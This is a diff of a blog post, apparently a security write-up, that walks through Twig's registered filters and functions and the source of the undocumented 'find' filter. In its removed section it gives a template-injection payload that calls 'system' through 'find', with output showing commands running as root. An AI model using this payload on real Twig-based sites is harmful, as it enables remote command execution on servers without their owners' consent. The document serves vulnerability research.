-            <span style="color:#ff79c6">new</span> TwigFilter(<span style="color:#f1fa8c">&#39;column&#39;</span>, [self<span style="color:#ff79c6">::</span><span style="color:#ff79c6">class</span>, <span style="color:#f1fa8c">&#39;column&#39;</span>]),
-            <span style="color:#ff79c6">new</span> TwigFilter(<span style="color:#f1fa8c">&#39;filter&#39;</span>, [self<span style="color:#ff79c6">::</span><span style="color:#ff79c6">class</span>, <span style="color:#f1fa8c">&#39;filter&#39;</span>], [<span style="color:#f1fa8c">&#39;needs_environment&#39;</span> =&gt; <span style="color:#ff79c6">true</span>]),
-            <span style="color:#ff79c6">new</span> TwigFilter(<span style="color:#f1fa8c">&#39;map&#39;</span>, [self<span style="color:#ff79c6">::</span><span style="color:#ff79c6">class</span>, <span style="color:#f1fa8c">&#39;map&#39;</span>], [<span style="color:#f1fa8c">&#39;needs_environment&#39;</span> =&gt; <span style="color:#ff79c6">true</span>]),
-            <span style="color:#ff79c6">new</span> TwigFilter(<span style="color:#f1fa8c">&#39;reduce&#39;</span>, [self<span style="color:#ff79c6">::</span><span style="color:#ff79c6">class</span>, <span style="color:#f1fa8c">&#39;reduce&#39;</span>], [<span style="color:#f1fa8c">&#39;needs_environment&#39;</span> =&gt; <span style="color:#ff79c6">true</span>]),
-            <span style="color:#ff79c6">new</span> TwigFilter(<span style="color:#f1fa8c">&#39;find&#39;</span>, [self<span style="color:#ff79c6">::</span><span style="color:#ff79c6">class</span>, <span style="color:#f1fa8c">&#39;find&#39;</span>], [<span style="color:#f1fa8c">&#39;needs_environment&#39;</span> =&gt; <span style="color:#ff79c6">true</span>]),
-
-            <span style="color:#6272a4">// string/array filters
-</span><span style="color:#6272a4"></span>            <span style="color:#ff79c6">new</span> TwigFilter(<span style="color:#f1fa8c">&#39;reverse&#39;</span>, [self<span style="color:#ff79c6">::</span><span style="color:#ff79c6">class</span>, <span style="color:#f1fa8c">&#39;reverse&#39;</span>], [<span style="color:#f1fa8c">&#39;needs_charset&#39;</span> =&gt; <span style="color:#ff79c6">true</span>]),
-            <span style="color:#ff79c6">new</span> TwigFilter(<span style="color:#f1fa8c">&#39;shuffle&#39;</span>, [self<span style="color:#ff79c6">::</span><span style="color:#ff79c6">class</span>, <span style="color:#f1fa8c">&#39;shuffle&#39;</span>], [<span style="color:#f1fa8c">&#39;needs_charset&#39;</span> =&gt; <span style="color:#ff79c6">true</span>]),
-            <span style="color:#ff79c6">new</span> TwigFilter(<span style="color:#f1fa8c">&#39;length&#39;</span>, [self<span style="color:#ff79c6">::</span><span style="color:#ff79c6">class</span>, <span style="color:#f1fa8c">&#39;length&#39;</span>], [<span style="color:#f1fa8c">&#39;needs_charset&#39;</span> =&gt; <span style="color:#ff79c6">true</span>]),
-            <span style="color:#ff79c6">new</span> TwigFilter(<span style="color:#f1fa8c">&#39;slice&#39;</span>, [self<span style="color:#ff79c6">::</span><span style="color:#ff79c6">class</span>, <span style="color:#f1fa8c">&#39;slice&#39;</span>], [<span style="color:#f1fa8c">&#39;needs_charset&#39;</span> =&gt; <span style="color:#ff79c6">true</span>]),
-            <span style="color:#ff79c6">new</span> TwigFilter(<span style="color:#f1fa8c">&#39;first&#39;</span>, [self<span style="color:#ff79c6">::</span><span style="color:#ff79c6">class</span>, <span style="color:#f1fa8c">&#39;first&#39;</span>], [<span style="color:#f1fa8c">&#39;needs_charset&#39;</span> =&gt; <span style="color:#ff79c6">true</span>]),
-            <span style="color:#ff79c6">new</span> TwigFilter(<span style="color:#f1fa8c">&#39;last&#39;</span>, [self<span style="color:#ff79c6">::</span><span style="color:#ff79c6">class</span>, <span style="color:#f1fa8c">&#39;last&#39;</span>], [<span style="color:#f1fa8c">&#39;needs_charset&#39;</span> =&gt; <span style="color:#ff79c6">true</span>]),
-
-            <span style="color:#6272a4">// iteration and runtime
-</span><span style="color:#6272a4"></span>            <span style="color:#ff79c6">new</span> TwigFilter(<span style="color:#f1fa8c">&#39;default&#39;</span>, [self<span style="color:#ff79c6">::</span><span style="color:#ff79c6">class</span>, <span style="color:#f1fa8c">&#39;default&#39;</span>], [<span style="color:#f1fa8c">&#39;node_class&#39;</span> =&gt; DefaultFilter<span style="color:#ff79c6">::</span><span style="color:#ff79c6">class</span>]),
-            <span style="color:#ff79c6">new</span> TwigFilter(<span style="color:#f1fa8c">&#39;keys&#39;</span>, [self<span style="color:#ff79c6">::</span><span style="color:#ff79c6">class</span>, <span style="color:#f1fa8c">&#39;keys&#39;</span>]),
-        ];
-    }
-
-    <span style="color:#ff79c6">public</span> <span style="color:#8be9fd;font-style:italic">function</span> getFunctions()<span style="color:#ff79c6">:</span> array
-    {
-        <span style="color:#ff79c6">return</span> [
-            <span style="color:#ff79c6">new</span> TwigFunction(<span style="color:#f1fa8c">&#39;parent&#39;</span>, <span style="color:#ff79c6">null</span>, [<span style="color:#f1fa8c">&#39;parser_callable&#39;</span> =&gt; [self<span style="color:#ff79c6">::</span><span style="color:#ff79c6">class</span>, <span style="color:#f1fa8c">&#39;parseParentFunction&#39;</span>]]),
-            <span style="color:#ff79c6">new</span> TwigFunction(<span style="color:#f1fa8c">&#39;block&#39;</span>, <span style="color:#ff79c6">null</span>, [<span style="color:#f1fa8c">&#39;parser_callable&#39;</span> =&gt; [self<span style="color:#ff79c6">::</span><span style="color:#ff79c6">class</span>, <span style="color:#f1fa8c">&#39;parseBlockFunction&#39;</span>]]),
-            <span style="color:#ff79c6">new</span> TwigFunction(<span style="color:#f1fa8c">&#39;attribute&#39;</span>, <span style="color:#ff79c6">null</span>, [<span style="color:#f1fa8c">&#39;parser_callable&#39;</span> =&gt; [self<span style="color:#ff79c6">::</span><span style="color:#ff79c6">class</span>, <span style="color:#f1fa8c">&#39;parseAttributeFunction&#39;</span>]]),
-            <span style="color:#ff79c6">new</span> TwigFunction(<span style="color:#f1fa8c">&#39;max&#39;</span>, <span style="color:#f1fa8c">&#39;max&#39;</span>),
-            <span style="color:#ff79c6">new</span> TwigFunction(<span style="color:#f1fa8c">&#39;min&#39;</span>, <span style="color:#f1fa8c">&#39;min&#39;</span>),
-            <span style="color:#ff79c6">new</span> TwigFunction(<span style="color:#f1fa8c">&#39;range&#39;</span>, <span style="color:#f1fa8c">&#39;range&#39;</span>),
-            <span style="color:#ff79c6">new</span> TwigFunction(<span style="color:#f1fa8c">&#39;constant&#39;</span>, [self<span style="color:#ff79c6">::</span><span style="color:#ff79c6">class</span>, <span style="color:#f1fa8c">&#39;constant&#39;</span>]),
-            <span style="color:#ff79c6">new</span> TwigFunction(<span style="color:#f1fa8c">&#39;cycle&#39;</span>, [self<span style="color:#ff79c6">::</span><span style="color:#ff79c6">class</span>, <span style="color:#f1fa8c">&#39;cycle&#39;</span>]),
-            <span style="color:#ff79c6">new</span> TwigFunction(<span style="color:#f1fa8c">&#39;random&#39;</span>, [self<span style="color:#ff79c6">::</span><span style="color:#ff79c6">class</span>, <span style="color:#f1fa8c">&#39;random&#39;</span>], [<span style="color:#f1fa8c">&#39;needs_charset&#39;</span> =&gt; <span style="color:#ff79c6">true</span>]),
-            <span style="color:#ff79c6">new</span> TwigFunction(<span style="color:#f1fa8c">&#39;date&#39;</span>, [$this, <span style="color:#f1fa8c">&#39;convertDate&#39;</span>]),
-            <span style="color:#ff79c6">new</span> TwigFunction(<span style="color:#f1fa8c">&#39;include&#39;</span>, [self<span style="color:#ff79c6">::</span><span style="color:#ff79c6">class</span>, <span style="color:#f1fa8c">&#39;include&#39;</span>], [<span style="color:#f1fa8c">&#39;needs_environment&#39;</span> =&gt; <span style="color:#ff79c6">true</span>, <span style="color:#f1fa8c">&#39;needs_context&#39;</span> =&gt; <span style="color:#ff79c6">true</span>, <span style="color:#f1fa8c">&#39;is_safe&#39;</span> =&gt; [<span style="color:#f1fa8c">&#39;all&#39;</span>]]),
-            <span style="color:#ff79c6">new</span> TwigFunction(<span style="color:#f1fa8c">&#39;source&#39;</span>, [self<span style="color:#ff79c6">::</span><span style="color:#ff79c6">class</span>, <span style="color:#f1fa8c">&#39;source&#39;</span>], [<span style="color:#f1fa8c">&#39;needs_environment&#39;</span> =&gt; <span style="color:#ff79c6">true</span>, <span style="color:#f1fa8c">&#39;is_safe&#39;</span> =&gt; [<span style="color:#f1fa8c">&#39;all&#39;</span>]]),
-            <span style="color:#ff79c6">new</span> TwigFunction(<span style="color:#f1fa8c">&#39;enum_cases&#39;</span>, [self<span style="color:#ff79c6">::</span><span style="color:#ff79c6">class</span>, <span style="color:#f1fa8c">&#39;enumCases&#39;</span>], [<span style="color:#f1fa8c">&#39;node_class&#39;</span> =&gt; EnumCasesFunction<span style="color:#ff79c6">::</span><span style="color:#ff79c6">class</span>]),
-        ];
-    }
-</code></pre></div><p>While reading the src code, we also checked the documentation, however one filter that was missing in the docs, the <code>find</code> filter</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>    <span style="color:#ff79c6">public</span> <span style="color:#8be9fd;font-style:italic">function</span> getFilters()<span style="color:#ff79c6">:</span> array
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> [
+</span></span><span style="display:flex;"><span>            <span style="color:#6272a4">// formatting filters
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>            <span style="color:#ff79c6">new</span> TwigFilter(<span style="color:#f1fa8c">&#39;date&#39;</span>, [$this, <span style="color:#f1fa8c">&#39;formatDate&#39;</span>]),
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">new</span> TwigFilter(<span style="color:#f1fa8c">&#39;date_modify&#39;</span>, [$this, <span style="color:#f1fa8c">&#39;modifyDate&#39;</span>]),
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">new</span> TwigFilter(<span style="color:#f1fa8c">&#39;format&#39;</span>, [self<span style="color:#ff79c6">::</span><span style="color:#ff79c6">class</span>, <span style="color:#f1fa8c">&#39;sprintf&#39;</span>]),
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">new</span> TwigFilter(<span style="color:#f1fa8c">&#39;replace&#39;</span>, [self<span style="color:#ff79c6">::</span><span style="color:#ff79c6">class</span>, <span style="color:#f1fa8c">&#39;replace&#39;</span>]),
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">new</span> TwigFilter(<span style="color:#f1fa8c">&#39;number_format&#39;</span>, [$this, <span style="color:#f1fa8c">&#39;formatNumber&#39;</span>]),
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">new</span> TwigFilter(<span style="color:#f1fa8c">&#39;abs&#39;</span>, <span style="color:#f1fa8c">&#39;abs&#39;</span>),
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">new</span> TwigFilter(<span style="color:#f1fa8c">&#39;round&#39;</span>, [self<span style="color:#ff79c6">::</span><span style="color:#ff79c6">class</span>, <span style="color:#f1fa8c">&#39;round&#39;</span>]),
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#6272a4">// encoding
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>            <span style="color:#ff79c6">new</span> TwigFilter(<span style="color:#f1fa8c">&#39;url_encode&#39;</span>, [self<span style="color:#ff79c6">::</span><span style="color:#ff79c6">class</span>, <span style="color:#f1fa8c">&#39;urlencode&#39;</span>]),
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">new</span> TwigFilter(<span style="color:#f1fa8c">&#39;json_encode&#39;</span>, <span style="color:#f1fa8c">&#39;json_encode&#39;</span>),
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">new</span> TwigFilter(<span style="color:#f1fa8c">&#39;convert_encoding&#39;</span>, [self<span style="color:#ff79c6">::</span><span style="color:#ff79c6">class</span>, <span style="color:#f1fa8c">&#39;convertEncoding&#39;</span>]),
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#6272a4">// string filters
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>            <span style="color:#ff79c6">new</span> TwigFilter(<span style="color:#f1fa8c">&#39;title&#39;</span>, [self<span style="color:#ff79c6">::</span><span style="color:#ff79c6">class</span>, <span style="color:#f1fa8c">&#39;titleCase&#39;</span>], [<span style="color:#f1fa8c">&#39;needs_charset&#39;</span> =&gt; <span style="color:#ff79c6">true</span>]),
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">new</span> TwigFilter(<span style="color:#f1fa8c">&#39;capitalize&#39;</span>, [self<span style="color:#ff79c6">::</span><span style="color:#ff79c6">class</span>, <span style="color:#f1fa8c">&#39;capitalize&#39;</span>], [<span style="color:#f1fa8c">&#39;needs_charset&#39;</span> =&gt; <span style="color:#ff79c6">true</span>]),
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">new</span> TwigFilter(<span style="color:#f1fa8c">&#39;upper&#39;</span>, [self<span style="color:#ff79c6">::</span><span style="color:#ff79c6">class</span>, <span style="color:#f1fa8c">&#39;upper&#39;</span>], [<span style="color:#f1fa8c">&#39;needs_charset&#39;</span> =&gt; <span style="color:#ff79c6">true</span>]),
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">new</span> TwigFilter(<span style="color:#f1fa8c">&#39;lower&#39;</span>, [self<span style="color:#ff79c6">::</span><span style="color:#ff79c6">class</span>, <span style="color:#f1fa8c">&#39;lower&#39;</span>], [<span style="color:#f1fa8c">&#39;needs_charset&#39;</span> =&gt; <span style="color:#ff79c6">true</span>]),
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">new</span> TwigFilter(<span style="color:#f1fa8c">&#39;striptags&#39;</span>, [self<span style="color:#ff79c6">::</span><span style="color:#ff79c6">class</span>, <span style="color:#f1fa8c">&#39;striptags&#39;</span>]),
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">new</span> TwigFilter(<span style="color:#f1fa8c">&#39;trim&#39;</span>, [self<span style="color:#ff79c6">::</span><span style="color:#ff79c6">class</span>, <span style="color:#f1fa8c">&#39;trim&#39;</span>]),
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">new</span> TwigFilter(<span style="color:#f1fa8c">&#39;nl2br&#39;</span>, [self<span style="color:#ff79c6">::</span><span style="color:#ff79c6">class</span>, <span style="color:#f1fa8c">&#39;nl2br&#39;</span>], [<span style="color:#f1fa8c">&#39;pre_escape&#39;</span> =&gt; <span style="color:#f1fa8c">&#39;html&#39;</span>, <span style="color:#f1fa8c">&#39;is_safe&#39;</span> =&gt; [<span style="color:#f1fa8c">&#39;html&#39;</span>]]),
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">new</span> TwigFilter(<span style="color:#f1fa8c">&#39;spaceless&#39;</span>, [self<span style="color:#ff79c6">::</span><span style="color:#ff79c6">class</span>, <span style="color:#f1fa8c">&#39;spaceless&#39;</span>], [<span style="color:#f1fa8c">&#39;is_safe&#39;</span> =&gt; [<span style="color:#f1fa8c">&#39;html&#39;</span>], <span style="color:#f1fa8c">&#39;deprecation_info&#39;</span> =&gt; <span style="color:#ff79c6">new</span> DeprecatedCallableInfo(<span style="color:#f1fa8c">&#39;twig/twig&#39;</span>, <span style="color:#f1fa8c">&#39;3.12&#39;</span>)]),
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#6272a4">// array helpers
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>            <span style="color:#ff79c6">new</span> TwigFilter(<span style="color:#f1fa8c">&#39;join&#39;</span>, [self<span style="color:#ff79c6">::</span><span style="color:#ff79c6">class</span>, <span style="color:#f1fa8c">&#39;join&#39;</span>]),
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">new</span> TwigFilter(<span style="color:#f1fa8c">&#39;split&#39;</span>, [self<span style="color:#ff79c6">::</span><span style="color:#ff79c6">class</span>, <span style="color:#f1fa8c">&#39;split&#39;</span>], [<span style="color:#f1fa8c">&#39;needs_charset&#39;</span> =&gt; <span style="color:#ff79c6">true</span>]),
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">new</span> TwigFilter(<span style="color:#f1fa8c">&#39;sort&#39;</span>, [self<span style="color:#ff79c6">::</span><span style="color:#ff79c6">class</span>, <span style="color:#f1fa8c">&#39;sort&#39;</span>], [<span style="color:#f1fa8c">&#39;needs_environment&#39;</span> =&gt; <span style="color:#ff79c6">true</span>]),
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">new</span> TwigFilter(<span style="color:#f1fa8c">&#39;merge&#39;</span>, [self<span style="color:#ff79c6">::</span><span style="color:#ff79c6">class</span>, <span style="color:#f1fa8c">&#39;merge&#39;</span>]),
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">new</span> TwigFilter(<span style="color:#f1fa8c">&#39;batch&#39;</span>, [self<span style="color:#ff79c6">::</span><span style="color:#ff79c6">class</span>, <span style="color:#f1fa8c">&#39;batch&#39;</span>]),
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">new</span> TwigFilter(<span style="color:#f1fa8c">&#39;column&#39;</span>, [self<span style="color:#ff79c6">::</span><span style="color:#ff79c6">class</span>, <span style="color:#f1fa8c">&#39;column&#39;</span>]),
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">new</span> TwigFilter(<span style="color:#f1fa8c">&#39;filter&#39;</span>, [self<span style="color:#ff79c6">::</span><span style="color:#ff79c6">class</span>, <span style="color:#f1fa8c">&#39;filter&#39;</span>], [<span style="color:#f1fa8c">&#39;needs_environment&#39;</span> =&gt; <span style="color:#ff79c6">true</span>]),
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">new</span> TwigFilter(<span style="color:#f1fa8c">&#39;map&#39;</span>, [self<span style="color:#ff79c6">::</span><span style="color:#ff79c6">class</span>, <span style="color:#f1fa8c">&#39;map&#39;</span>], [<span style="color:#f1fa8c">&#39;needs_environment&#39;</span> =&gt; <span style="color:#ff79c6">true</span>]),
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">new</span> TwigFilter(<span style="color:#f1fa8c">&#39;reduce&#39;</span>, [self<span style="color:#ff79c6">::</span><span style="color:#ff79c6">class</span>, <span style="color:#f1fa8c">&#39;reduce&#39;</span>], [<span style="color:#f1fa8c">&#39;needs_environment&#39;</span> =&gt; <span style="color:#ff79c6">true</span>]),
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">new</span> TwigFilter(<span style="color:#f1fa8c">&#39;find&#39;</span>, [self<span style="color:#ff79c6">::</span><span style="color:#ff79c6">class</span>, <span style="color:#f1fa8c">&#39;find&#39;</span>], [<span style="color:#f1fa8c">&#39;needs_environment&#39;</span> =&gt; <span style="color:#ff79c6">true</span>]),
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#6272a4">// string/array filters
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>            <span style="color:#ff79c6">new</span> TwigFilter(<span style="color:#f1fa8c">&#39;reverse&#39;</span>, [self<span style="color:#ff79c6">::</span><span style="color:#ff79c6">class</span>, <span style="color:#f1fa8c">&#39;reverse&#39;</span>], [<span style="color:#f1fa8c">&#39;needs_charset&#39;</span> =&gt; <span style="color:#ff79c6">true</span>]),
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">new</span> TwigFilter(<span style="color:#f1fa8c">&#39;shuffle&#39;</span>, [self<span style="color:#ff79c6">::</span><span style="color:#ff79c6">class</span>, <span style="color:#f1fa8c">&#39;shuffle&#39;</span>], [<span style="color:#f1fa8c">&#39;needs_charset&#39;</span> =&gt; <span style="color:#ff79c6">true</span>]),
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">new</span> TwigFilter(<span style="color:#f1fa8c">&#39;length&#39;</span>, [self<span style="color:#ff79c6">::</span><span style="color:#ff79c6">class</span>, <span style="color:#f1fa8c">&#39;length&#39;</span>], [<span style="color:#f1fa8c">&#39;needs_charset&#39;</span> =&gt; <span style="color:#ff79c6">true</span>]),
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">new</span> TwigFilter(<span style="color:#f1fa8c">&#39;slice&#39;</span>, [self<span style="color:#ff79c6">::</span><span style="color:#ff79c6">class</span>, <span style="color:#f1fa8c">&#39;slice&#39;</span>], [<span style="color:#f1fa8c">&#39;needs_charset&#39;</span> =&gt; <span style="color:#ff79c6">true</span>]),
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">new</span> TwigFilter(<span style="color:#f1fa8c">&#39;first&#39;</span>, [self<span style="color:#ff79c6">::</span><span style="color:#ff79c6">class</span>, <span style="color:#f1fa8c">&#39;first&#39;</span>], [<span style="color:#f1fa8c">&#39;needs_charset&#39;</span> =&gt; <span style="color:#ff79c6">true</span>]),
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">new</span> TwigFilter(<span style="color:#f1fa8c">&#39;last&#39;</span>, [self<span style="color:#ff79c6">::</span><span style="color:#ff79c6">class</span>, <span style="color:#f1fa8c">&#39;last&#39;</span>], [<span style="color:#f1fa8c">&#39;needs_charset&#39;</span> =&gt; <span style="color:#ff79c6">true</span>]),
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#6272a4">// iteration and runtime
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>            <span style="color:#ff79c6">new</span> TwigFilter(<span style="color:#f1fa8c">&#39;default&#39;</span>, [self<span style="color:#ff79c6">::</span><span style="color:#ff79c6">class</span>, <span style="color:#f1fa8c">&#39;default&#39;</span>], [<span style="color:#f1fa8c">&#39;node_class&#39;</span> =&gt; DefaultFilter<span style="color:#ff79c6">::</span><span style="color:#ff79c6">class</span>]),
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">new</span> TwigFilter(<span style="color:#f1fa8c">&#39;keys&#39;</span>, [self<span style="color:#ff79c6">::</span><span style="color:#ff79c6">class</span>, <span style="color:#f1fa8c">&#39;keys&#39;</span>]),
+</span></span><span style="display:flex;"><span>        ];
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">public</span> <span style="color:#8be9fd;font-style:italic">function</span> getFunctions()<span style="color:#ff79c6">:</span> array
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> [
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">new</span> TwigFunction(<span style="color:#f1fa8c">&#39;parent&#39;</span>, <span style="color:#ff79c6">null</span>, [<span style="color:#f1fa8c">&#39;parser_callable&#39;</span> =&gt; [self<span style="color:#ff79c6">::</span><span style="color:#ff79c6">class</span>, <span style="color:#f1fa8c">&#39;parseParentFunction&#39;</span>]]),
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">new</span> TwigFunction(<span style="color:#f1fa8c">&#39;block&#39;</span>, <span style="color:#ff79c6">null</span>, [<span style="color:#f1fa8c">&#39;parser_callable&#39;</span> =&gt; [self<span style="color:#ff79c6">::</span><span style="color:#ff79c6">class</span>, <span style="color:#f1fa8c">&#39;parseBlockFunction&#39;</span>]]),
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">new</span> TwigFunction(<span style="color:#f1fa8c">&#39;attribute&#39;</span>, <span style="color:#ff79c6">null</span>, [<span style="color:#f1fa8c">&#39;parser_callable&#39;</span> =&gt; [self<span style="color:#ff79c6">::</span><span style="color:#ff79c6">class</span>, <span style="color:#f1fa8c">&#39;parseAttributeFunction&#39;</span>]]),
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">new</span> TwigFunction(<span style="color:#f1fa8c">&#39;max&#39;</span>, <span style="color:#f1fa8c">&#39;max&#39;</span>),
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">new</span> TwigFunction(<span style="color:#f1fa8c">&#39;min&#39;</span>, <span style="color:#f1fa8c">&#39;min&#39;</span>),
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">new</span> TwigFunction(<span style="color:#f1fa8c">&#39;range&#39;</span>, <span style="color:#f1fa8c">&#39;range&#39;</span>),
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">new</span> TwigFunction(<span style="color:#f1fa8c">&#39;constant&#39;</span>, [self<span style="color:#ff79c6">::</span><span style="color:#ff79c6">class</span>, <span style="color:#f1fa8c">&#39;constant&#39;</span>]),
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">new</span> TwigFunction(<span style="color:#f1fa8c">&#39;cycle&#39;</span>, [self<span style="color:#ff79c6">::</span><span style="color:#ff79c6">class</span>, <span style="color:#f1fa8c">&#39;cycle&#39;</span>]),
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">new</span> TwigFunction(<span style="color:#f1fa8c">&#39;random&#39;</span>, [self<span style="color:#ff79c6">::</span><span style="color:#ff79c6">class</span>, <span style="color:#f1fa8c">&#39;random&#39;</span>], [<span style="color:#f1fa8c">&#39;needs_charset&#39;</span> =&gt; <span style="color:#ff79c6">true</span>]),
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">new</span> TwigFunction(<span style="color:#f1fa8c">&#39;date&#39;</span>, [$this, <span style="color:#f1fa8c">&#39;convertDate&#39;</span>]),
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">new</span> TwigFunction(<span style="color:#f1fa8c">&#39;include&#39;</span>, [self<span style="color:#ff79c6">::</span><span style="color:#ff79c6">class</span>, <span style="color:#f1fa8c">&#39;include&#39;</span>], [<span style="color:#f1fa8c">&#39;needs_environment&#39;</span> =&gt; <span style="color:#ff79c6">true</span>, <span style="color:#f1fa8c">&#39;needs_context&#39;</span> =&gt; <span style="color:#ff79c6">true</span>, <span style="color:#f1fa8c">&#39;is_safe&#39;</span> =&gt; [<span style="color:#f1fa8c">&#39;all&#39;</span>]]),
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">new</span> TwigFunction(<span style="color:#f1fa8c">&#39;source&#39;</span>, [self<span style="color:#ff79c6">::</span><span style="color:#ff79c6">class</span>, <span style="color:#f1fa8c">&#39;source&#39;</span>], [<span style="color:#f1fa8c">&#39;needs_environment&#39;</span> =&gt; <span style="color:#ff79c6">true</span>, <span style="color:#f1fa8c">&#39;is_safe&#39;</span> =&gt; [<span style="color:#f1fa8c">&#39;all&#39;</span>]]),
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">new</span> TwigFunction(<span style="color:#f1fa8c">&#39;enum_cases&#39;</span>, [self<span style="color:#ff79c6">::</span><span style="color:#ff79c6">class</span>, <span style="color:#f1fa8c">&#39;enumCases&#39;</span>], [<span style="color:#f1fa8c">&#39;node_class&#39;</span> =&gt; EnumCasesFunction<span style="color:#ff79c6">::</span><span style="color:#ff79c6">class</span>]),
+</span></span><span style="display:flex;"><span>        ];
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>While reading the src code, we also checked the documentation, however one filter that was missing in the docs, the <code>find</code> filter</p>
 <p>Awesome let&rsquo;s check it&rsquo;s code and see maybe its possible to use it</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">    <span style="color:#ff79c6">public</span> <span style="color:#ff79c6">static</span> <span style="color:#8be9fd;font-style:italic">function</span> find(Environment $env, $array, $arrow)
-    {
-        self<span style="color:#ff79c6">::</span>checkArrowInSandbox($env, $arrow, <span style="color:#f1fa8c">&#39;find&#39;</span>, <span style="color:#f1fa8c">&#39;filter&#39;</span>);
-
-        foreach ($array as $k =&gt; $v) {
-            <span style="color:#ff79c6">if</span> ($arrow($v, $k)) {
-                <span style="color:#ff79c6">return</span> $v;
-            }
-        }
-
-        <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">null</span>;
-    }
-</code></pre></div><p>We can see this code is allowing us to include an arrow function. Easy now let&rsquo;s see how we can use find to get RCE</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">{{ [<span style="color:#f1fa8c">&#39;id&#39;</span>]<span style="color:#ff79c6">|</span>find(<span style="color:#f1fa8c">&#39;system&#39;</span>) }} <span style="color:#6272a4">// uid=0(root) gid=0(root) groups=0(root)
-</span></code></pre></div><p>Nice! okey now for the real issues..</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>    <span style="color:#ff79c6">public</span> <span style="color:#ff79c6">static</span> <span style="color:#8be9fd;font-style:italic">function</span> find(Environment $env, $array, $arrow)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        self<span style="color:#ff79c6">::</span>checkArrowInSandbox($env, $arrow, <span style="color:#f1fa8c">&#39;find&#39;</span>, <span style="color:#f1fa8c">&#39;filter&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        foreach ($array as $k =&gt; $v) {
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">if</span> ($arrow($v, $k)) {
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">return</span> $v;
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">null</span>;
+</span></span><span style="display:flex;"><span>    }
